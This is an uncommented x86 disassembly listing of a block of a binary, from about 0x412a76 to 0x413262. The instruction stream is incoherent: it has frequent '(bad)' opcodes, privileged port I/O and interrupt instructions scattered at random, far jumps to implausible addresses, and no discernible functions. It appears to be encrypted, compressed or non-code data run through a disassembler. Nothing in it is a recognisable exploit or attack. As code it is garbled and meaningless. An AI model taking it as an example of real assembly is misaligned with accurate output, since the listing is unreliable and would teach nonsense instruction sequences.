  412a76:	nop
  412a77:	adc    dl,BYTE PTR [edx-0x3e]
  412a7a:	and    al,0xf8
  412a7c:	pop    ds
  412a7d:	and    DWORD PTR [ebp+0x5b],edi
  412a80:	stos   DWORD PTR es:[edi],eax
  412a81:	jae    0x412aa0
  412a83:	fs mov edi,0xc7f9d3ca
  412a89:	shl    BYTE PTR [ebx+eiz*1-0x6f6216ac],1
  412a90:	sub    esp,ecx
  412a92:	adc    al,BYTE PTR [edi+edi*2-0x25]
  412a96:	cmp    ch,cl
  412a98:	clc    
  412a99:	nop
  412a9a:	cpuid  
  412a9c:	cdq    
  412a9d:	in     eax,0xda
  412a9f:	test   eax,0x7cbc1d8f
  412aa4:	dec    ebp
  412aa5:	dec    edi
  412aa6:	push   esp
  412aa7:	ds test al,0x42
  412aaa:	leave  
  412aab:	mov    eax,0x874ac51d
  412ab0:	test   BYTE PTR ds:0x37471b13,bh
  412ab6:	jns    0x412a79
  412ab8:	fidivr DWORD PTR [edx-0x1875a7b4]
  412abe:	shl    esp,cl
  412ac0:	cwde   
  412ac1:	jae    0x412a55
  412ac3:	retf   
  412ac4:	sub    al,BYTE PTR [ebp-0x40896278]
  412aca:	div    DWORD PTR [ecx]
  412acc:	cdq    
  412acd:	push   ebp
  412ace:	lea    esp,[edi+esi*1-0x141d0650]
  412ad5:	fimul  WORD PTR [edx-0xb]
  412ad8:	mov    bh,BYTE PTR [ecx+0x57b473c9]
  412ade:	inc    esp
  412adf:	jle    0x412a69
  412ae1:	aam    0x90
  412ae3:	dec    edi
  412ae4:	and    BYTE PTR ds:0xd3f8ef91,cl
  412aea:	dec    ebp
  412aeb:	nop
  412aec:	jmp    0x2b4a899c
  412af1:	gs iret 
  412af3:	or     DWORD PTR [eax],0xffffffa8
  412af6:	shr    DWORD PTR ss:[esi+0x20b4aad4],1
  412afd:	ret    0xe3a2
  412b00:	mov    WORD PTR [ecx+eiz*2],es
  412b03:	test   DWORD PTR [edi],edx
  412b05:	rcr    BYTE PTR [ebp+0x24c7475e],0x44
  412b0c:	out    dx,eax
  412b0d:	retf   
  412b0e:	xor    esi,DWORD PTR [ebx]
  412b10:	mov    al,ds:0x5b1037d5
  412b15:	inc    edi
  412b16:	xor    bh,dh
  412b18:	js     0x412b59
  412b1a:	mov    ch,0xca
  412b1c:	stos   BYTE PTR es:[edi],al
  412b1d:	jg     0x412af6
  412b1f:	pop    ebx
  412b20:	int    0xef
  412b22:	jecxz  0x412b24
  412b24:	mov    al,dh
  412b26:	popa   
  412b27:	cmp    eax,0xbd154f5c
  412b2c:	dec    ecx
  412b2d:	pop    ecx
  412b2e:	jb     0x412b9d
  412b30:	xor    al,0xeb
  412b32:	test   DWORD PTR [esi+0x11a7d177],ecx
  412b38:	add    BYTE PTR [ebx],0x13
  412b3b:	scas   eax,DWORD PTR es:[edi]
  412b3c:	ds mov esi,0x39293d9c
  412b42:	ins    DWORD PTR es:[edi],dx
  412b43:	retf   0x4a4f
  412b46:	inc    esp
  412b47:	cli    
  412b48:	mov    ebp,esi
  412b4a:	jp     0x412bc1
  412b4c:	mov    dh,0x12
  412b4e:	mov    ds:0x72acbac1,eax
  412b53:	jo     0x412b8e
  412b55:	out    dx,eax
  412b56:	fsubr  DWORD PTR [ecx-0x37]
  412b59:	jno    0x412b65
  412b5b:	and    al,0xf3
  412b5d:	mov    ds:0x75e0eb26,al
  412b62:	inc    ebp
  412b63:	fmul   DWORD PTR [edx]
  412b65:	push   esi
  412b67:	xor    al,0xf4
  412b69:	cmp    eax,0xbebc1619
  412b6e:	enter  0x6843,0x22
  412b72:	jo     0x412b4a
  412b74:	loopne 0x412b6b
  412b76:	or     ah,BYTE PTR [edx+0x2b]
  412b79:	loopne 0x412b45
  412b7b:	imul   ecx,DWORD PTR ds:0xb33e3896,0x881a1367
  412b85:	aad    0xed
  412b87:	pop    esp
  412b88:	jl     0x412b6a
  412b8a:	mov    eax,0xb59e82ea
  412b8f:	sbb    bl,BYTE PTR ss:[eax+eax*2]
  412b93:	xor    DWORD PTR [ebx+0x8d8f870],0x5a
  412b9a:	push   0xc0f9e648
  412b9f:	cmp    bh,ch
  412ba1:	mov    dh,0x12
  412ba3:	xor    edi,ebx
  412ba5:	mov    bh,0x38
  412ba7:	push   ss
  412ba8:	or     DWORD PTR [ecx-0x6b],0x8ec41165
  412baf:	test   BYTE PTR [eax+0x47],dl
  412bb2:	jb     0x412be2
  412bb4:	clc    
  412bb5:	(bad)  
  412bb6:	adc    DWORD PTR [esp+edi*1+0x2c13a259],esi
  412bbd:	loope  0x412bc3
  412bbf:	clc    
  412bc0:	mov    al,ds:0x688b5235
  412bc5:	mov    ah,0xf4
  412bc7:	push   esp
  412bc8:	mov    ah,BYTE PTR [ebx-0x4f4140e8]
  412bce:	jbe    0x412c32
  412bd0:	test   BYTE PTR [esi+ecx*4-0x2b],al
  412bd4:	pop    ds
  412bd5:	mov    cl,0x12
  412bd7:	and    BYTE PTR [eax],0x5f
  412bda:	(bad)  
  412bdb:	fstp   DWORD PTR [esp+ecx*1+0x67]
  412bdf:	outs   dx,BYTE PTR ds:[esi]
  412be0:	cmp    BYTE PTR [ebp-0x73],cl
  412be3:	xchg   ebp,eax
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	add    DWORD PTR [ecx],edi
  412be7:	(bad)  
  412be8:	push   esp
  412be9:	add    edx,DWORD PTR [esi+0x71]
  412bec:	and    edi,DWORD PTR [edi-0x1a33e403]
  412bf2:	nop
  412bf3:	mov    DWORD PTR [edx-0x28],esi
  412bf6:	and    BYTE PTR [edi-0x1e867565],dl
  412bfc:	mov    DWORD PTR [esi+eax*2],eax
  412bff:	jo     0x412c01
  412c01:	jae    0x412c3d
  412c03:	(bad)  [ecx-0x4c]
  412c06:	fldenv [edx+0x218cfaa4]
  412c0c:	out    0xee,eax
  412c0e:	mov    ch,0x46
  412c10:	mov    eax,ds:0x2cd6f8c0
  412c15:	leave  
  412c16:	add    al,bh
  412c18:	mov    al,0x17
  412c1a:	les    edi,FWORD PTR [edi+0x18]
  412c1d:	je     0x412c53
  412c1f:	or     eax,0x723cf740
  412c24:	adc    al,bh
  412c26:	push   eax
  412c27:	out    0xb1,al
  412c29:	(bad)  
  412c2b:	mov    ch,0xc0
  412c2d:	xchg   ecx,eax
  412c2e:	pop    edi
  412c2f:	mov    eax,0xf7759764
  412c34:	hlt    
  412c35:	mov    WORD PTR [esi+0x6c386755],?
  412c3b:	and    BYTE PTR [esi+0x4f],ch
  412c3e:	cmc    
  412c3f:	fiadd  WORD PTR [ebx-0x75b8c9ae]
  412c45:	cld    
  412c46:	test   DWORD PTR ds:0xbb9b3f04,esp
  412c4c:	and    cl,BYTE PTR [eax+edi*2-0x29]
  412c50:	cmp    dl,bl
  412c52:	fcmovu st,st(7)
  412c54:	imul   ecx,DWORD PTR [esi-0x6075cfbc],0xdb51e417
  412c5e:	cmp    DWORD PTR [edi+0x48718902],esp
  412c64:	xchg   BYTE PTR [si],ah
  412c67:	jg     0x412c3b
  412c69:	xchg   esp,eax
  412c6a:	adc    ebx,DWORD PTR [ecx+eiz*4+0x7d1bfe05]
  412c71:	sbb    al,BYTE PTR [edi-0x1730c5ac]
  412c77:	pop    edx
  412c78:	cmp    ax,0x4edc
  412c7c:	jb     0x412c13
  412c7e:	jl     0x412c29
  412c80:	mov    ecx,0x445ad396
  412c85:	(bad)
  412c88:	pop    esp
  412c89:	ficom  DWORD PTR [esi+eiz*8+0x6d]
  412c8d:	imul   esi,DWORD PTR [eax+edx*4-0x67],0xbbc792dd
  412c95:	(bad)  
  412c96:	jae    0x412ce0
  412c98:	push   ss
  412c99:	(bad)  
  412c9b:	fs inc esp
  412c9d:	mov    esp,edx
  412c9f:	jo     0x412cb3
  412ca1:	mov    al,0x21
  412ca3:	mov    edi,DWORD PTR [esi+0x1e]
  412ca6:	in     al,dx
  412ca7:	cmp    dl,al
  412ca9:	ins    BYTE PTR es:[edi],dx
  412caa:	stc    
  412cab:	pop    ebx
  412cac:	xchg   edi,eax
  412cad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cae:	mov    ch,dh
  412cb0:	and    cl,ah
  412cb2:	push   ebx
  412cb3:	xchg   BYTE PTR [ebp+0x558bd4e9],al
  412cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412cba:	sub    eax,0x3709b02e
  412cbf:	add    bl,BYTE PTR [ecx+0x7b]
  412cc2:	or     bl,bl
  412cc4:	loop   0x412cb2
  412cc6:	test   al,0xb7
  412cc8:	push   edx
  412cc9:	jae    0x412d45
  412ccb:	dec    edi
  412ccc:	xor    al,BYTE PTR [ecx+0x7b]
  412ccf:	into   
  412cd0:	jmp    0xc383:0xae2a1b6b
  412cd7:	test   BYTE PTR [edx+0x1c62c15],dh
  412cdd:	cmp    dl,BYTE PTR [esp+esi*1-0x9]
  412ce1:	push   ebp
  412ce2:	cmp    edi,DWORD PTR [edi]
  412ce4:	mov    ecx,0xf89237ed
  412ce9:	adc    al,0xea
  412ceb:	sub    eax,0x6c9aafe3
  412cf0:	mov    eax,0xfa9402c2
  412cf5:	and    eax,0x6e440871
  412cfa:	push   ds
  412cfb:	out    dx,al
  412cfc:	loop   0x412ce4
  412cfe:	(bad)  
  412d00:	mov    esp,0x55091b5a
  412d05:	jecxz  0x412d7e
  412d07:	xchg   ecx,eax
  412d08:	xor    DWORD PTR [edx],0x59
  412d0b:	push   esp
  412d0c:	lock out dx,al
  412d0e:	xchg   ebx,eax
  412d0f:	les    ebp,FWORD PTR [ecx-0x14]
  412d12:	stos   DWORD PTR es:[edi],eax
  412d13:	mov    fs,esi
  412d15:	(bad)  
  412d16:	cli    
  412d17:	pusha  
  412d18:	or     DWORD PTR [edi-0x40],esp
  412d1b:	inc    ecx
  412d1c:	dec    edx
  412d1d:	push   esp
  412d1e:	push   eax
  412d1f:	ret    
  412d20:	aam    0x39
  412d22:	add    cl,al
  412d24:	jbe    0x412d9d
  412d26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d27:	mov    eax,0xd88928c1
  412d2c:	cdq    
  412d2d:	fisub  WORD PTR ss:[edi]
  412d30:	jge    0x412d3c
  412d32:	cli    
  412d33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d34:	popa   
  412d35:	mov    eax,0xf2df912d
  412d3a:	(bad)  
  412d3b:	sti    
  412d3c:	pop    edi
  412d3d:	je     0x412cd9
  412d3f:	jp     0x412d96
  412d41:	(bad)  
  412d42:	add    edi,DWORD PTR [edx]
  412d44:	data16 adc BYTE PTR [ecx],bh
  412d47:	sub    eax,0xca9ae5ac
  412d4c:	push   es
  412d4d:	cld    
  412d4e:	jb     0x412d31
  412d50:	loope  0x412d0b
  412d52:	leave  
  412d53:	frstor [ebx+edx*4-0x1a]
  412d57:	pop    edi
  412d58:	cwde   
  412d59:	inc    eax
  412d5a:	ret    
  412d5b:	out    0x21,al
  412d5d:	add    esi,DWORD PTR [esi-0x3a]
  412d60:	mov    cl,0x7f
  412d62:	inc    eax
  412d63:	push   esp
  412d64:	out    0xa9,al
  412d66:	jo     0x412dd9
  412d68:	ja     0x412da7
  412d6a:	aaa    
  412d6b:	fidiv  DWORD PTR [eax+0x5f]
  412d6e:	inc    edi
  412d6f:	pop    esp
  412d70:	dec    ebx
  412d71:	iret   
  412d72:	out    dx,al
  412d73:	mov    esi,edx
  412d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d76:	inc    eax
  412d77:	pop    ebp
  412d78:	push   eax
  412d79:	cli    
  412d7a:	clc    
  412d7b:	add    al,0x7e
  412d7d:	pop    esp
  412d7e:	ss and ch,0x17
  412d82:	arpl   WORD PTR [edi+0x4fe8bdc9],bx
  412d88:	pop    edi
  412d89:	pop    edx
  412d8a:	sub    ecx,DWORD PTR [edi]
  412d8c:	pusha  
  412d8d:	push   ss
  412d8e:	adc    DWORD PTR [eax-0x2d],ebp
  412d91:	test   DWORD PTR [esp+eiz*2+0x6f98c5f3],eax
  412d98:	cmp    al,BYTE PTR [edi]
  412d9a:	add    DWORD PTR [edi+0x34f46706],ebp
  412da0:	cmp    eax,0x37
  412da3:	and    esi,edx
  412da5:	or     eax,0x6d59483c
  412daa:	and    al,0xe1
  412dac:	xchg   esp,eax
  412dad:	repnz pop ds
  412daf:	add    esp,DWORD PTR [ebx]
  412db1:	pop    esp
  412db2:	(bad)  
  412db3:	stos   DWORD PTR es:[edi],eax
  412db4:	les    ebx,FWORD PTR [esi]
  412db6:	mov    dh,0x85
  412db8:	pop    es
  412db9:	cli    
  412dba:	xor    DWORD PTR es:[ebx],ecx
  412dbd:	(bad)  [ebx+0x4189b649]
  412dc3:	je     0x412d82
  412dc5:	fsubr  st(7),st
  412dc7:	aas    
  412dc8:	lea    edi,[ecx+0x2a]
  412dcb:	in     al,dx
  412dcc:	aam    0xd5
  412dce:	jmp    FWORD PTR [esi]
  412dd0:	mov    ebx,0xfdd44412
  412dd5:	enter  0xd694,0x9d
  412dd9:	ret    0xc3e2
  412ddc:	inc    ebp
  412ddd:	sub    edx,DWORD PTR ds:0x742325a8
  412de3:	mov    eax,0xb6967592
  412de8:	add    al,0x3f
  412dea:	(bad)  
  412deb:	int    0x8c
  412ded:	xchg   ebp,eax
  412dee:	mov    ecx,0xd719fac1
  412df3:	push   edx
  412df4:	aam    0xc5
  412df6:	mov    dh,BYTE PTR ds:0x769af76d
  412dfc:	jp     0x412e35
  412dfe:	dec    esi
  412dff:	clc    
  412e00:	jge    0x412e5a
  412e02:	sbb    BYTE PTR [edi+0x26],al
  412e05:	inc    ecx
  412e06:	push   edx
  412e07:	sysenter 
  412e09:	pop    edi
  412e0a:	fiadd  WORD PTR [edx+0x4d]
  412e0d:	test   cl,ch
  412e0f:	dec    esp
  412e10:	mov    edx,0xc80c6f93
  412e15:	pop    ebx
  412e16:	push   ebx
  412e17:	in     al,0xca
  412e19:	jne    0x412e8d
  412e1b:	push   ebx
  412e1c:	fiadd  DWORD PTR [ebx+0x39fdae0d]
  412e22:	in     al,0x53
  412e24:	test   al,0xad
  412e26:	cdq    
  412e27:	(bad)  
  412e28:	xchg   ebx,eax
  412e29:	sbb    eax,0x9f235f24
  412e2e:	mov    DWORD PTR cs:[eax+ebx*8+0x4e],ecx
  412e33:	or     eax,DWORD PTR [ecx-0x77dbc45b]
  412e39:	in     eax,dx
  412e3a:	and    DWORD PTR [edi+0x12],ecx
  412e3d:	lds    esi,FWORD PTR [ebx+0x5113b1c3]
  412e43:	push   esi
  412e44:	ins    DWORD PTR es:[edi],dx
  412e45:	cs or  al,0x9d
  412e48:	or     al,0xba
  412e4a:	shr    dh,1
  412e4c:	fmul   QWORD PTR [eax-0x3bda1500]
  412e52:	push   edx
  412e53:	fucomip st,st(7)
  412e55:	clc    
  412e56:	jne    0x412e03
  412e58:	cld    
  412e59:	sub    cl,BYTE PTR [ecx]
  412e5b:	sbb    edx,ebp
  412e5d:	scas   eax,DWORD PTR es:[edi]
  412e5e:	repz in al,dx
  412e60:	mov    bl,BYTE PTR [eax-0x35]
  412e63:	popf   
  412e64:	xchg   DWORD PTR [edx+0x5d],edx
  412e67:	sbb    DWORD PTR [esi+edi*1+0x62],ebp
  412e6b:	adc    BYTE PTR [esi-0x3e897564],0x8b
  412e72:	cmp    eax,0x4bc4a962
  412e77:	mov    dl,BYTE PTR [edx+ebp*8-0x78e85a38]
  412e7e:	loopne 0x412e00
  412e80:	inc    eax
  412e81:	xchg   edi,ecx
  412e83:	in     eax,0x98
  412e85:	or     DWORD PTR [esp+esi*8-0x71],eax
  412e89:	loope  0x412e62
  412e8b:	mov    BYTE PTR [ecx+0x62],al
  412e8e:	sahf   
  412e8f:	rcr    DWORD PTR [ecx+0x42],0xca
  412e93:	jns    0x412ea6
  412e95:	mov    esi,0x8d14f056
  412e9a:	mov    al,0x90
  412e9c:	adc    DWORD PTR [edx],ecx
  412e9e:	jbe    0x412e6d
  412ea0:	sbb    cl,BYTE PTR [ebp-0x18]
  412ea3:	(bad)  
  412ea4:	dec    ebx
  412ea5:	stc    
  412ea6:	dec    eax
  412ea7:	test   eax,0xaa86444e
  412eac:	sbb    al,0x3b
  412eae:	shl    DWORD PTR [edi-0x6893ad1e],1
  412eb4:	cmp    ecx,DWORD PTR [ebx+esi*1-0x378aa8c4]
  412ebb:	push   edi
  412ebc:	aad    0xcd
  412ebe:	std    
  412ebf:	pop    ds
  412ec0:	jo     0x412ecf
  412ec2:	push   0xffffffe2
  412ec4:	pusha  
  412ec5:	push   ds
  412ec6:	sbb    al,0x81
  412ec8:	mov    BYTE PTR [ebp+ebx*1-0x54402a3e],bh
  412ecf:	sub    DWORD PTR [ecx-0x1133eb51],ebx
  412ed5:	loop   0x412f07
  412ed7:	and    esp,DWORD PTR [ecx+edx*2]
  412eda:	jmp    0xadf1:0x8d0ff4a9
  412ee1:	std    
  412ee2:	push   ss
  412ee3:	popf   
  412ee4:	mov    ds:0xe254f1f9,eax
  412ee9:	fistp  QWORD PTR [edi+edx*4-0x5e88149d]
  412ef0:	mov    BYTE PTR [edi],cl
  412ef2:	inc    ecx
  412ef3:	add    esi,DWORD PTR [ecx-0x44]
  412ef6:	rcl    DWORD PTR [ecx-0x56f3e3b9],1
  412efc:	loop   0x412f7c
  412efe:	or     al,0x14
  412f00:	out    0xe5,al
  412f02:	push   ecx
  412f03:	mov    dh,0x2f
  412f05:	cmp    ebx,edx
  412f07:	mov    edi,0x1fbcb3ad
  412f0c:	jg     0x412f45
  412f0e:	adc    cl,BYTE PTR [edi+0x52ef3496]
  412f14:	(bad)  [eax+eax*8-0x3f]
  412f18:	(bad)
  412f1b:	leave  
  412f1c:	scas   al,BYTE PTR es:[edi]
  412f1d:	pop    ebx
  412f1e:	pop    ss
  412f1f:	std    
  412f20:	stos   DWORD PTR es:[edi],eax
  412f21:	sar    BYTE PTR ds:0x1c29d4b4,0x6
  412f28:	cmp    BYTE PTR [ebx+0x7f],al
  412f2b:	xor    BYTE PTR [edi],bl
  412f2d:	xchg   BYTE PTR [esi+0x48781c1],bh
  412f33:	dec    eax
  412f34:	jnp    0x412eec
  412f36:	push   edx
  412f37:	mov    bl,0x6d
  412f39:	mov    ch,0x2d
  412f3b:	jmp    FWORD PTR [eax+0x30d92de]
  412f41:	add    esp,0x637e13c6
  412f47:	mov    eax,0xe6206dc
  412f4c:	pop    esi
  412f4d:	add    DWORD PTR [esi],edx
  412f4f:	add    BYTE PTR [edx+ecx*2+0x4a],bl
  412f53:	xchg   ecx,eax
  412f54:	js     0x412f15
  412f56:	xor    ebp,eax
  412f58:	sti    
  412f59:	ret    0xbbe0
  412f5c:	sbb    eax,0x5d5671a4
  412f61:	sar    BYTE PTR [edx-0x53],cl
  412f64:	jg     0x412fa4
  412f66:	fbld   TBYTE PTR ss:[edx+0x6d497356]
  412f6d:	jp     0x412f2e
  412f6f:	addr16 mov al,ds:0xea75
  412f73:	sub    DWORD PTR [esi+eax*8],eax
  412f76:	cmp    edi,esi
  412f78:	xor    BYTE PTR [ecx-0x7fa6d41a],bh
  412f7e:	in     eax,0x1
  412f80:	imul   esp,edx,0xffffff99
  412f83:	inc    edx
  412f84:	aas    
  412f85:	jb     0x412f13
  412f87:	sub    BYTE PTR [edx+0x4f868187],0x38
  412f8e:	(bad)  
  412f8f:	pop    ss
  412f90:	lods   eax,DWORD PTR ds:[esi]
  412f91:	hlt    
  412f92:	call   0xfd04a701
  412f97:	xor    ebp,0xb1d27984
  412f9d:	dec    ebp
  412f9e:	push   ebx
  412f9f:	add    BYTE PTR [ecx-0x46],ah
  412fa2:	mov    dh,0x5b
  412fa4:	loope  0x412f31
  412fa6:	cmp    eax,0x3f5412e3
  412fab:	push   ecx
  412fac:	sub    eax,DWORD PTR [edi+eiz*1+0x14]
  412fb0:	aaa    
  412fb1:	call   0x11596221
  412fb6:	push   edi
  412fb7:	mov    cl,0x20
  412fb9:	pop    esi
  412fba:	pop    eax
  412fbb:	fcomp  DWORD PTR [edi+0x4e4784]
  412fc1:	xchg   sp,ax
  412fc3:	mov    dl,0x39
  412fc5:	int3   
  412fc6:	jp     0x413047
  412fc8:	daa    
  412fc9:	sub    al,0x67
  412fcb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fcc:	xchg   esp,eax
  412fcd:	jge    0x412fa5
  412fcf:	out    dx,eax
  412fd0:	ins    BYTE PTR es:[edi],dx
  412fd1:	cmp    DWORD PTR [esi],esp
  412fd3:	xor    al,0xeb
  412fd5:	and    eax,0xef50a125
  412fda:	fcmovnbe st,st(1)
  412fdc:	cwde   
  412fdd:	in     eax,dx
  412fde:	jp     0x412f60
  412fe0:	cli    
  412fe1:	cmp    cl,BYTE PTR [ebx+ecx*2]
  412fe4:	icebp  
  412fe5:	push   ecx
  412fe6:	xlat   BYTE PTR ds:[ebx]
  412fe7:	fmul   DWORD PTR [esi-0x40]
  412fea:	inc    edx
  412feb:	lods   al,BYTE PTR ds:[esi]
  412fec:	dec    esp
  412fed:	sbb    edi,DWORD PTR [esi+0x2a]
  412ff0:	mov    bl,0x6a
  412ff2:	loop   0x412fa9
  412ff4:	sub    ebp,esp
  412ff6:	rol    bl,0x99
  412ff9:	int    0x5b
  412ffb:	retf   0x11c2
  412ffe:	mov    ebp,0x8dbbed2e
  413003:	test   ecx,0xeb3208d3
  413009:	add    esi,ebx
  41300b:	xor    eax,0xee213943
  413010:	and    al,0x21
  413012:	and    eax,0x4294da97
  413017:	xchg   edi,eax
  413018:	mov    ecx,0x926bc7cc
  41301d:	sub    al,0x3d
  41301f:	outs   dx,BYTE PTR ds:[esi]
  413020:	leave  
  413021:	rcr    al,0xd4
  413024:	mov    WORD PTR [ecx+0x71214446],fs
  41302a:	out    dx,eax
  41302b:	sub    bl,bh
  41302d:	pusha  
  41302e:	xor    BYTE PTR [ecx-0x3f],dh
  413031:	lahf   
  413032:	mov    esi,0x2318d8bd
  413037:	jbe    0x413045
  413039:	in     al,dx
  41303a:	int    0x2e
  41303c:	ja     0x413055
  41303e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41303f:	bswap  ebx
  413041:	mov    ebp,0x32c90a5c
  413046:	push   ebx
  413047:	aam    0xe3
  413049:	aam    0xc0
  41304b:	loopne 0x41308e
  41304d:	adc    DWORD PTR [ebx+0x1a],ecx
  413050:	int3   
  413051:	jge    0x412fdc
  413053:	repnz cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  413056:	or     BYTE PTR [edx+0x496607af],al
  41305c:	fld    QWORD PTR [edx]
  41305e:	xor    eax,0xcfcde619
  413063:	mov    bh,cl
  413065:	outs   dx,DWORD PTR ds:[esi]
  413066:	je     0x413004
  413068:	dec    edx
  413069:	push   esp
  41306a:	mov    al,0x88
  41306c:	outs   dx,BYTE PTR ds:[esi]
  41306d:	loop   0x41309a
  41306f:	jb     0x413028
  413071:	inc    eax
  413072:	test   DWORD PTR [edx+0x36],edx
  413075:	sub    BYTE PTR [ebp+0x6],bl
  413078:	jecxz  0x4130bf
  41307a:	mov    al,0x1a
  41307c:	sub    ebp,DWORD PTR [ecx+ebx*1]
  41307f:	pop    ebx
  413080:	test   DWORD PTR [eax+0x21],0x432f594a
  413087:	in     al,dx
  413088:	std    
  413089:	(bad)  
  41308a:	mov    bl,BYTE PTR [edi+0x4a]
  41308d:	jnp    0x413017
  41308f:	cwde   
  413090:	and    al,0xca
  413092:	xor    eax,0x84f5b284
  413097:	popf   
  413098:	not    DWORD PTR [edx-0x61]
  41309b:	or     ebp,ebx
  41309d:	les    ebx,FWORD PTR ds:0xde39f7b2
  4130a3:	mov    esi,0x7e1dea24
  4130a8:	mov    bh,0x61
  4130aa:	int    0xe1
  4130ac:	dec    ecx
  4130ad:	pusha  
  4130ae:	das    
  4130af:	adc    ah,al
  4130b1:	pusha  
  4130b2:	and    dl,BYTE PTR [esi-0x7f]
  4130b5:	add    ch,BYTE PTR [edx]
  4130b7:	add    DWORD PTR ss:[bx+si-0x60],ebp
  4130bc:	lods   al,BYTE PTR ds:[esi]
  4130bd:	mov    eax,0x16cec3b8
  4130c2:	cmp    al,0x7
  4130c4:	mov    esp,DWORD PTR [ebp-0x3ce885e]
  4130ca:	inc    ebx
  4130cb:	dec    ecx
  4130cc:	mov    esi,0xa1f89dbf
  4130d1:	push   es
  4130d2:	scas   eax,DWORD PTR es:[edi]
  4130d3:	retf   0x209b
  4130d6:	in     al,0xfe
  4130d8:	jmp    DWORD PTR [eax+0x3b]
  4130db:	clc    
  4130dc:	xor    ah,BYTE PTR ss:[esi+eiz*4+0x74]
  4130e1:	inc    edi
  4130e2:	and    eax,0x8d2a73d4
  4130e7:	test   al,0x6a
  4130e9:	pop    eax
  4130ea:	mov    eax,0x32e21aa7
  4130ef:	scas   al,BYTE PTR es:[edi]
  4130f0:	and    eax,0x41f4758a
  4130f5:	dec    ecx
  4130f6:	push   es
  4130f7:	iret   
  4130f8:	mov    esi,0x4958ff8e
  4130fd:	sahf   
  4130fe:	jge    0x413129
  413100:	inc    ebx
  413101:	or     BYTE PTR [esi+0x1d571f48],dl
  413107:	xor    BYTE PTR [ebx+0x3fed50a3],0x18
  41310e:	repnz cmp cl,BYTE PTR [esi-0x7b]
  413112:	adc    eax,0xe3ac731a
  413117:	call   0x52ed:0xa90c9ed3
  41311e:	fimul  DWORD PTR [edi+eiz*4+0x61]
  413122:	mov    bh,0x59
  413124:	mov    bl,0xc2
  413126:	xor    eax,0x38d7ce6c
  41312b:	ret    0xbffd
  41312e:	inc    edi
  41312f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413130:	aaa    
  413131:	mov    esp,0x8413e68c
  413136:	iret   
  413137:	push   ss
  413138:	inc    eax
  413139:	fcomp  DWORD PTR [eax]
  41313b:	mov    al,ds:0x3afaf5e6
  413140:	leave  
  413141:	fidivr DWORD PTR [edi-0x23]
  413144:	aaa    
  413145:	xor    al,0xba
  413147:	mov    dl,0x5c
  413149:	mov    eax,0xb827fbde
  41314e:	ds js  0x4131aa
  413151:	mov    ebx,0xab4a2100
  413156:	int    0xa3
  413158:	fdiv   DWORD PTR [bp+si-0x45]
  41315c:	shl    DWORD PTR [edi+0x42],cl
  41315f:	scas   al,BYTE PTR es:[edi]
  413160:	xchg   edx,eax
  413161:	sub    bl,BYTE PTR [esi-0x71f84844]
  413167:	add    DWORD PTR [esi-0x373f3e0b],ebx
  41316d:	push   0xe465e0af
  413172:	fst    QWORD PTR [edi-0x7f]
  413175:	gs je  0x413196
  413178:	jl     0x4131ce
  41317a:	ins    DWORD PTR es:[edi],dx
  41317b:	iret   
  41317c:	adc    BYTE PTR ds:0xa24c3525,ah
  413182:	push   ss
  413183:	ret    
  413184:	out    0xe3,eax
  413186:	and    esi,DWORD PTR [edx-0x1e27b1bf]
  41318c:	test   BYTE PTR [edi+ebp*1],ch
  41318f:	push   0x63
  413191:	mov    ds:0x28a3909e,eax
  413196:	jnp    0x413178
  413198:	pop    ebp
  413199:	adc    esp,esp
  41319b:	adc    ah,BYTE PTR [esi-0x1c]
  41319e:	mov    ah,0x8a
  4131a0:	test   DWORD PTR [edx-0x2d598e76],eax
  4131a6:	in     eax,0x8d
  4131a8:	ret    
  4131a9:	aam    0xee
  4131ab:	inc    ecx
  4131ac:	or     BYTE PTR [ecx+ecx*2+0x2e4657dd],ch
  4131b3:	mov    ds:0xa9a1f06d,eax
  4131b8:	xor    al,0x80
  4131ba:	cmc    
  4131bb:	mov    edi,0xaf9376db
  4131c0:	sbb    dl,BYTE PTR [ebp+0x6f]
  4131c3:	add    esi,edx
  4131c5:	cmp    DWORD PTR [edx+0x5aeeca6c],esi
  4131cb:	or     al,dh
  4131cd:	jmp    0x4131bc
  4131cf:	stos   DWORD PTR es:[edi],eax
  4131d0:	sbb    DWORD PTR [ebx+0x1b3df394],edi
  4131d6:	adc    bh,dh
  4131d8:	inc    ax
  4131da:	pop    edi
  4131db:	pop    ecx
  4131dc:	jns    0x4131b3
  4131de:	dec    edi
  4131df:	add    edx,DWORD PTR [ecx+ebp*8]
  4131e2:	push   cs
  4131e3:	mov    edi,0xd06d88df
  4131e8:	stos   BYTE PTR es:[edi],al
  4131e9:	xchg   esp,eax
  4131ea:	adc    al,0x4a
  4131ec:	iret   
  4131ed:	mov    ch,BYTE PTR [ebp+0x20e9584d]
  4131f3:	imul   eax,DWORD PTR ds:0xc05a5a6e,0x327b03c1
  4131fd:	leave  
  4131fe:	fsubr  st,st(4)
  413200:	pop    ss
  413201:	icebp  
  413202:	dec    esp
  413203:	or     BYTE PTR [eax],0xbc
  413206:	ja     0x41327a
  413208:	pop    es
  413209:	jb     0x4131ca
  41320b:	(bad)  
  41320c:	and    al,0x75
  41320e:	sub    dh,dl
  413210:	cmp    DWORD PTR [eax+0x431df055],edx
  413216:	(bad)
  41321a:	jmp    0x41328d
  41321c:	or     al,0x15
  41321e:	rcl    DWORD PTR [esi+0x11cb469f],cl
  413224:	(bad)  
  413226:	mov    al,ds:0xb639179d
  41322b:	mov    edx,0x83f81060
  413230:	cmp    eax,DWORD PTR [ebx]
  413232:	adc    edx,DWORD PTR [ebx+0x4c459582]
  413238:	ret    
  413239:	hlt    
  41323a:	add    ebp,ecx
  41323c:	rol    ch,1
  41323e:	das    
  41323f:	push   ebx
  413240:	push   ss
  413241:	mov    edx,0xd506509c
  413246:	addr16 sub al,0x8a
  413249:	add    BYTE PTR [ecx],ah
  41324b:	mov    esi,0x61228e00
  413250:	cmp    eax,0x862b54ff
  413255:	and    eax,0x5a760f96
  41325a:	mov    bl,0x87
  41325c:	bound  edx,QWORD PTR [ebx-0x66887904]
  413262:	or     al,0x85
